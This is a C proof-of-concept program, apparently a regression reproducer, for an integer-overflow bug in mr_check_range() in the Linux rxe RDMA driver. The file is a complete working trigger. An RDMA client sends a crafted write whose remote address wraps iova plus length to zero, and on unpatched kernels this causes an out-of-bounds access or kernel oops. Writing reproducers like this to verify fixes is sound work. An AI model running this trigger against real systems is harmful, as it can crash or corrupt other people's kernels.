// SPDX-License-Identifier: GPL-2.0
/*
 * rxe_mr_overflow.c - trigger mr_check_range() iova overflow (OOB)
 *
 * Companion to rxe_mr_overflow.sh. The server registers a USER/MEM_REG MR
 * and accepts an RDMA_CM connection, passing its rkey via private data. The
 * client posts a single RDMA-WRITE whose remote_addr is chosen so that
 * iova + length wraps to 0 in mr_check_range():
 *
 *     iova + length = 0xfffffffffffffff8 + 8 = 2^64 = 0
 *
 * On an *unpatched* kernel this bypasses mr_check_range(), and the responder
 * computes a huge index in rxe_mr_iova_to_index() (WARN_ON(idx >= nbuf)) and
 * dereferences mr->page_info[huge] -> out-of-bounds access / oops.
 *
 * On a *patched* kernel mr_check_range() rejects the crafted iova and the
 * client completion is IBV_WC_REM_ACCESS_ERR (remote access error).
 *
 * Build: see Makefile (needs libibverbs-dev / librdmacm-dev).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <infiniband/verbs.h>
#include <rdma/rdma_cma.h>

#define BAD_ADDR	0xfffffffffffffff8ULL	/* iova + WR_LEN wraps to 0 */
#define WR_LEN		8
#define MR_LEN		4096

struct mr_info {
	uint32_t rkey;
	uint32_t pad;
	uint64_t iova;
} __attribute__((packed));

static int wait_ev(struct rdma_event_channel *ec, struct rdma_cm_event **ev,
		   enum rdma_cm_event_type want)
{
	while (rdma_get_cm_event(ec, ev) == 0) {
		if ((*ev)->event != want) {
			fprintf(stderr, "unexpected event %s (want %s)\n",
				rdma_event_str((*ev)->event), rdma_event_str(want));
			rdma_ack_cm_event(*ev);
			return -1;
		}
		return 0;
	}
	perror("rdma_get_cm_event");
	return -1;
}

static int run_server(const char *ip, int port)
{
	struct rdma_event_channel *ec = rdma_create_event_channel();
	struct rdma_cm_id *lid;
	struct rdma_cm_event *ev;

	if (!ec) { perror("event_channel"); return 1; }
	if (rdma_create_id(ec, &lid, NULL, RDMA_PS_TCP)) { perror("create_id"); return 1; }

	struct sockaddr_in sin = {0};
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	if (!inet_pton(AF_INET, ip, &sin.sin_addr)) { fprintf(stderr, "bad ip\n"); return 1; }

	if (rdma_bind_addr(lid, (struct sockaddr *)&sin)) { perror("bind_addr"); return 1; }
	if (rdma_listen(lid, 1)) { perror("listen"); return 1; }
	printf("[server] listen %s:%d dev=%s\n", ip, port,
		lid->verbs ? ibv_get_device_name(lid->verbs->device) : "?");
	fflush(stdout);

	if (wait_ev(ec, &ev, RDMA_CM_EVENT_CONNECT_REQUEST)) return 1;
	struct rdma_cm_id *id = ev->id;

	struct ibv_pd *pd = ibv_alloc_pd(id->verbs);
	struct ibv_cq *cq = ibv_create_cq(id->verbs, 8, NULL, NULL, 0);
	if (!pd || !cq) { perror("alloc_pd/create_cq"); return 1; }
	void *buf = calloc(1, MR_LEN);
	struct ibv_mr *mr = ibv_reg_mr(pd, buf, MR_LEN,
		IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE);
	if (!mr) { perror("reg_mr"); return 1; }

	struct ibv_qp_init_attr qa = {0};
	qa.send_cq = cq; qa.recv_cq = cq; qa.qp_type = IBV_QPT_RC;
	qa.cap.max_send_wr = 4; qa.cap.max_recv_wr = 4;
	qa.cap.max_send_sge = 2; qa.cap.max_recv_sge = 2;
	if (rdma_create_qp(id, pd, &qa)) { perror("create_qp"); return 1; }

	struct mr_info info = { .rkey = mr->rkey, .iova = (uint64_t)(uintptr_t)buf };
	struct rdma_conn_param p = {0};
	p.private_data = &info;
	p.private_data_len = sizeof(info);
	p.initiator_depth = 1;
	p.responder_resources = 1;
	if (rdma_accept(id, &p)) { perror("accept"); return 1; }
	rdma_ack_cm_event(ev);
	printf("[server] accepted rkey=%#x iova=%#llx; waiting for client write\n",
		mr->rkey, (unsigned long long)info.iova);
	fflush(stdout);

	/* The OOB (if unpatched) fires here in the responder path. */
	sleep(5);
	return 0;
}

static int run_client(const char *ip, int port)
{
	struct rdma_event_channel *ec = rdma_create_event_channel();
	struct rdma_cm_id *id;
	struct rdma_cm_event *ev;

	if (!ec) { perror("event_channel"); return 1; }
	if (rdma_create_id(ec, &id, NULL, RDMA_PS_TCP)) { perror("create_id"); return 1; }

	struct sockaddr_in sin = {0};
	sin.sin_family = AF_INET; sin.sin_port = htons(port);
	if (!inet_pton(AF_INET, ip, &sin.sin_addr)) { fprintf(stderr, "bad ip\n"); return 1; }

	if (rdma_resolve_addr(id, NULL, (struct sockaddr *)&sin, 5000)) { perror("resolve_addr"); return 1; }
	if (wait_ev(ec, &ev, RDMA_CM_EVENT_ADDR_RESOLVED)) return 1;
	rdma_ack_cm_event(ev);
	if (rdma_resolve_route(id, 5000)) { perror("resolve_route"); return 1; }
	if (wait_ev(ec, &ev, RDMA_CM_EVENT_ROUTE_RESOLVED)) return 1;
	rdma_ack_cm_event(ev);

	struct ibv_pd *pd = ibv_alloc_pd(id->verbs);
	struct ibv_cq *cq = ibv_create_cq(id->verbs, 8, NULL, NULL, 0);
	void *buf = calloc(1, MR_LEN);
	struct ibv_mr *mr = ibv_reg_mr(pd, buf, MR_LEN, IBV_ACCESS_LOCAL_WRITE);
	struct ibv_qp_init_attr qa = {0};
	qa.send_cq = cq; qa.recv_cq = cq; qa.qp_type = IBV_QPT_RC;
	qa.cap.max_send_wr = 4; qa.cap.max_recv_wr = 4;
	qa.cap.max_send_sge = 2; qa.cap.max_recv_sge = 2;
	if (rdma_create_qp(id, pd, &qa)) { perror("create_qp"); return 1; }

	struct rdma_conn_param p = {0};
	p.initiator_depth = 1; p.responder_resources = 1; p.retry_count = 3;
	if (rdma_connect(id, &p)) { perror("connect"); return 1; }
	if (wait_ev(ec, &ev, RDMA_CM_EVENT_ESTABLISHED)) return 1;

	struct mr_info info = {0};
	if (ev->param.conn.private_data_len >= (int)sizeof(info))
		memcpy(&info, ev->param.conn.private_data, sizeof(info));
	rdma_ack_cm_event(ev);

	/* The malicious RDMA-WRITE: remote_addr makes iova+length wrap. */
	struct ibv_sge sge = { .addr = (uintptr_t)buf, .length = WR_LEN, .lkey = mr->lkey };
	struct ibv_send_wr wr = {0}, *bad;
	wr.wr_id = 0xdead;
	wr.opcode = IBV_WR_RDMA_WRITE;
	wr.send_flags = IBV_SEND_SIGNALED;
	wr.sg_list = &sge;
	wr.num_sge = 1;
	wr.wr.rdma.remote_addr = BAD_ADDR;
	wr.wr.rdma.rkey = info.rkey;
	printf("[client] post RDMA-WRITE remote_addr=%#llx len=%d rkey=%#x\n",
		(unsigned long long)BAD_ADDR, WR_LEN, info.rkey);
	fflush(stdout);
	ibv_post_send(id->qp, &wr, &bad);

	struct ibv_wc wc;
	int n, tries = 5000;
	while (tries-- > 0 && (n = ibv_poll_cq(cq, 1, &wc)) == 0)
		usleep(1000);
	if (n > 0)
		printf("[client] completion status=%d (%s)\n",
			wc.status, ibv_wc_status_str(wc.status));
	else
		printf("[client] no completion (responder likely crashed)\n");
	sleep(2);
	return 0;
}

int main(int argc, char **argv)
{
	if (argc == 3)			/* server <ip> <port> */
		return run_server(argv[1], atoi(argv[2]));
	if (argc == 4 && !strcmp(argv[1], "-c"))	/* -c <ip> <port> */
		return run_client(argv[2], atoi(argv[3]));
	fprintf(stderr, "Usage:\n  server: %s <ip> <port>\n  client: %s -c <ip> <port>\n",
		argv[0], argv[0]);
	return 1;
}
